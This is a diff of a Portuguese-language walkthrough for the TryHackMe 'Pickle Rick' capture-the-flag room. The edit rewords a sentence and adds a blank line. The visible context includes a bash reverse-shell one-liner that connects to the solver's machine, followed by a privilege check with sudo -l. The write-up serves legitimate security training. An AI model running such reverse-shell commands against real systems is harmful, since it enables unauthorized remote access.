@@ -10,6 +10,7 @@
 Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/picklerick), feito por [Try Hack Me](https://tryhackme.com/p/tryhackme), [ar33zy](https://tryhackme.com/p/ar33zy) e [arebel](https://tryhackme.com/p/arebel).
 
 Dificuldade: `Fácil`
+
 Resolvido em: `2026/03/28`
 
 # Conteúdos
@@ -195,7 +196,7 @@ Mas o comando não funcionou quando invocado desta forma. Com `echo`, realizei u
 echo "bash -i >& /dev/tcp/<MY_MACHINE_IP>/1234 0>&1" | bash
 ```
 
-E funcionou, estabelecendo a conexão com meu terminal. Imediatamente, invoquei `sudo -l` para verificar as permissões do sistema, obtendo ótimas notícias:
+O que simplesmente encadeia meu comando, e funcionou, estabelecendo a conexão com meu terminal. Imediatamente, invoquei `sudo -l` para verificar as permissões do sistema, obtendo ótimas notícias:
 
 ```bash
 Matching Defaults entries for www-data on ip-<MACHINE_IP>:
